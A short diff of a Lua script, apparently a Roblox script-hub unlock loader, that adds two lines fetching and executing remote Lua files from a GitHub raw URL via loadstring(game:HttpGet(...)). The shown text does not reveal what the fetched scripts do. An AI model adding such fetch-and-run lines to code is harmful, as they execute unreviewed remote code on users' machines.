@@ -365,10 +365,11 @@ local function loadMain(key)
 		}
 	):Play()
 	task.delay(0.5, function()
-		ScreenGui:Destroy()
-		loadstring(game:HttpGet(LOADER_URL))()
-	end)
-end
+    ScreenGui:Destroy()
+    loadstring(game:HttpGet(LOADER_URL))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Tvenn16/QH/main/BARFQH.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Tvenn16/QH/main/LEMONSQH.lua"))()
+end)
 
 -- ── UNLOCK LOGIC ──────────────────────────────────────────────────────────
 local function onSubmit()
